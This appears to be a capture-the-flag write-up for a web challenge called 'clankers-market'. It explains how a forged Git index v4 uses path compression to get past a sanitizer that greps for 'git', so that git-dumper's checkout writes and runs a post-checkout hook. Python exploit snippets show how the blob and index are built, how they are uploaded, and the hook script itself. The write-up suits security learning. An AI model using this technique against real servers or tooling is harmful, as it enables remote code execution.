# clankers-market

**Category:** Web

## Description
> People still leak clanker keys norwadays?

## Overview
This challenge is an unsafe Git-processing pipeline, not a secret leak. The server lets authenticated users upload arbitrary files into a fresh repository, then runs `git-dumper` on that attacker-controlled repository; the solve abuses a crafted Git index v4 so `git checkout .` writes and executes `.git/hooks/post-checkout` even though `sanitize()` tries to delete obvious Git payloads. The hook runs the SUID `/usr/local/bin/read-flag` helper and overwrites `/tmp/dump/flag.txt`, which the Flask route then returns.

## Technical details
The exact root cause is a trust-boundary violation in `/clanker-feature`: the application accepts attacker-controlled files inside `.git`, serves that repository over HTTP, and then asks Git tooling to reconstruct and check it out. The upload validation only constrains where the uploaded files are saved:

```python
file_path = os.path.join(WORKDIR, file.filename)
normalized_path = os.path.abspath(file_path)

if not normalized_path.startswith(WORKDIR + os.sep):
    ...

file.save(normalized_path)
```

This blocks direct path traversal in the upload filename, but it does nothing against malicious Git metadata. An attacker can still upload `.git/index` and arbitrary loose objects under `.git/objects/...`, and those files are later interpreted by Git itself.

After the upload, the repository is sanitized. The relevant filter is content-based:

```python
run_command("rm -rf .git/hooks")
run_command("rm -rf .git/commondir")
run_command("rm -rf .git/info")
run_command(r"grep -rlZ 'git' . | xargs -0 rm -f --")
```

So a literal `.git/hooks/post-checkout` script or an index containing the raw bytes `git` would be deleted. `solve.py` is built around bypassing exactly that check:

```python
assert b"git" not in idx_data, "index still contains forbidden substring 'git'"
assert b"git" not in obj_data, "object still contains forbidden substring 'git'"
```

The primitive comes from Git index version 4 path compression. `solve.py` creates two entries that point to the same blob:

```python
entries = [
    b"../dump/.g",
    b"../dump/.git/hooks/post-checkout",
]
```

The second path is not written verbatim. `compress_v4_path()` stores only the suffix that differs from the previous path:

```python
common = 0
for a, b in zip(path, previous):
    if a != b:
        break
    common += 1
remove_len = len(previous) - common
suffix = path[common:]
return encode_varint(remove_len) + suffix + b"\x00"
```

Because the previous entry already ends in `../dump/.g`, the compressed second entry only needs the suffix `it/hooks/post-checkout`. The raw index bytes therefore never contain the substring `git`, so `grep -rlZ 'git'` does not remove `.git/index`. But when Git parses the v4 index, it reconstructs the full second pathname as `../dump/.git/hooks/post-checkout`. A local reproduction with the generated index shows the decoded entries:

```text
100755 50eb791b11d231914aab911a8c7505c03a9b111b 0	../dump/.g
100755 50eb791b11d231914aab911a8c7505c03a9b111b 0	../dump/.git/hooks/post-checkout
```

That is enough to turn checkout into an attacker-controlled file-write primitive. The server serves `/tmp/git_storage` with `python3 -m http.server 12345`, then executes:

```python
run_command("git-dumper http://localhost:12345 /tmp/dump")

with open("/tmp/dump/flag.txt", "r") as f:
    flag = f.read().strip()
```

The upstream `git-dumper` implementation explicitly reconstructs the worktree by running `git checkout .` after fetching `.git/index` and the objects. On Git 2.34.1, replaying the crafted index locally produces:

```text
Updated 2 paths from the index
.git/hooks/post-checkout: 2: /usr/local/bin/read-flag: not found
```

The first line proves Git honored the malicious index entries; the second proves the newly written `post-checkout` hook was executed during checkout.

The uploaded blob is the hook body:

```python
script = b"#!/bin/sh\n/usr/local/bin/read-flag > flag.txt\n"
obj_sha, obj_data = build_blob(script)
obj_name = f".git/objects/{obj_sha[:2]}/{obj_sha[2:]}"
```

`build_blob()` wraps the script as a valid Git blob (`b"blob <len>\\0" + script`) and zlib-compresses it so it can be dropped directly into `.git/objects/...`. During `git checkout .` inside `/tmp/dump`, Git materializes that blob as `/tmp/dump/.git/hooks/post-checkout` and then executes it.

The Dockerfile shows why this leads directly to the real flag. The image builds a SUID helper that reads `/flag.txt` and installs it as `/usr/local/bin/read-flag`, then the Flask route later reads `/tmp/dump/flag.txt`. The hook bridges those two facts: it executes the privileged helper and redirects the output into the exact file that the route returns. The full exploit chain is therefore:

1. Upload attacker-controlled `.git/index` and matching loose object into `/tmp/git_storage`.
2. Bypass `sanitize()` because the raw index bytes never contain `git`.
3. Let `git-dumper` fetch that metadata and run `git checkout .` in `/tmp/dump`.
4. Use the crafted index to write `.git/hooks/post-checkout`, then rely on Git to execute it.
5. Overwrite `/tmp/dump/flag.txt` with the output of `/usr/local/bin/read-flag`.
6. Receive that file back in the rendered HTTP response.

## Proof-of-Concept
- Step 1: Build a Git blob whose contents are the hook we want Git to execute.

```python
script = b"#!/bin/sh\n/usr/local/bin/read-flag > flag.txt\n"
obj_sha, obj_data = build_blob(script)
obj_name = f".git/objects/{obj_sha[:2]}/{obj_sha[2:]}"
```

This produces a valid loose-object payload for `.git/objects/<sha[:2]>/<sha[2:]>`. That object will later be materialized either as `../dump/.g` or `../dump/.git/hooks/post-checkout`, because both index entries reference the same blob SHA-1.

- Step 2: Forge a v4 index whose decoded second path is `.git/hooks/post-checkout`, while the raw bytes still avoid the substring `git`.

```python
entries = [
    b"../dump/.g",
    b"../dump/.git/hooks/post-checkout",
]
idx_data = build_index_v4(obj_sha, len(script))
assert b"git" not in idx_data
```

This produces the malicious `.git/index`. The important artifact is the compressed second pathname: Git reconstructs `../dump/.git/hooks/post-checkout`, but the file survives `sanitize()` because only the suffix `it/hooks/post-checkout` is stored in the index bytes.

- Step 3: Upload the forged index and the matching blob object to the challenge.

```python
files = [
    ("file", (".git/index", idx_data, "application/octet-stream")),
    ("file", (obj_name, obj_data, "application/octet-stream")),
]
r = sess.post(base + "/clanker-feature", files=files, timeout=20)
```

This places attacker-controlled Git metadata inside `/tmp/git_storage/.git`. The route then serves that repository and invokes `git-dumper`, so the server itself performs the dangerous checkout step on our crafted metadata.

- Step 4: Let `git checkout .` write and execute the hook, then extract the flag from the response.

```python
m = re.search(r"bctf\{[^}]+\}", r.text)
print("FLAG:", m.group(0))
```

At this point the server has already run `git-dumper`, which runs `git checkout .` in `/tmp/dump`. The hook executes `/usr/local/bin/read-flag > flag.txt`, overwriting `/tmp/dump/flag.txt`; the Flask route opens that file and embeds the real flag in `r.text`, which the regex extracts.

## P/S
The upload path check is not bypassed directly; every uploaded filename still resolves under `/tmp/git_storage`. The bug appears later, when Git interprets attacker-controlled repository metadata and honors index paths that the Flask layer never validated. The fake `flag.txt` and optional `.env` secrets created by `setup_git_storage()` are decoys; the real flag path comes from the SUID helper in the Docker image.
